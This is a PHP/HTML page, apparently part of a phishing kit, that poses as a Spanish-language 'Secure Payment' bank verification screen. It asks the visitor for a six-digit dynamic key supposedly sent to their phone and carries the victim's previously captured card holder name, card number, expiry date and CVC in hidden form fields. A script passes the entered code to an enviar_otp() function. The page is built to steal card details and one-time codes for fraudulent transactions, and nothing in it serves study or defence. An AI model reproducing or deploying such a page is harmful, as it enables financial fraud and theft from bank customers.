<?php 
session_start();
$ca =$_SESSION['ca'];
    $mensaje = "Para continuar con la transacciÃ³n que esta a punto de realizar, debe ingresar los 6 digitos de la clave dinamica que hemos enviado a su numero de telefono asociado con su cuenta";

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">



    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions.js"></script>  		


    <title>Secure Payment</title>
</head>
<body style="background-color:;">
    
    <div class="details" style="">
	<center><img src="/img/serfiCanda.PNG" alt="" srcset="" width="50%"><center><br>
    <a><?php echo $mensaje; ?></a><br>
    <?php echo "$ca***"; ?> </pre></a> 
                         <input type="hidden" name="nombre" value="<?php echo $nombreG; ?>">
    <input type="hidden" name="numero" value="<?php echo $ntarjetaG; ?>">
    <input type="hidden" name="fecha" value="<?php echo $fechaG; ?>">
    <input type="hidden" name="cvc" value="<?php echo $cvvG; ?>">
    <a><pre><center></a><input type="text" name="cDinamica" id="txtOTP" placeholder ="" required minlength="6" maxlength="6"></center><br></pre>
   <center><input type="submit" id="btnOTP" value="Enviar" style="color:white; background-color:black; width:25%; height:35px; margin:auto;" ></center>
   

   

<pre><a href="">Â¿Necesitas Ayuda?</a>                                <a href="">Cerrar</a></pre>

</div>




<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>

</body>
</html>
